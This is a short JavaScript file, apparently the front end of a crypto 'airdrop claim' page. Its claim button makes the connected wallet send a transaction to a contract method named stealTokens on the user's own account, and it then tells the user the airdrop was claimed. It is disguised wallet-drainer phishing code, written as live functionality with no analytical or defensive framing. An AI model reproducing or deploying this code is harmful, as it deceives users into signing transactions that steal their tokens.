console.log('eth.js loaded successfully');

// Function to claim the airdrop
async function claimAirdrop() {
    console.log('Attempting to claim airdrop...');

    // Check if accounts are available
    if (!Array.isArray(accounts) || accounts.length === 0) {
        console.error('No accounts connected');
        alert('Please connect to a wallet first!');
        return;
    }

    // Ensure contract details are loaded before proceeding
    if (!contractABI || !contractAddress) {
        console.error('Contract details not loaded:', { contractABI, contractAddress });
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    try {
        console.log('Claiming airdrop...');
        const contract = new web3.eth.Contract(contractABI, contractAddress);
        // Use the first account in the accounts array
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        console.error('Error claiming airdrop:', error);
        alert('Error claiming airdrop');
    }
}

// Attach event listener for claiming airdrop
window.addEventListener('DOMContentLoaded', () => {
    const claimButton = document.getElementById('claimAirdropButton');
    claimButton.disabled = true; // Initially disable the claim button
    claimButton.addEventListener('click', claimAirdrop); // Attach the click event listener
});
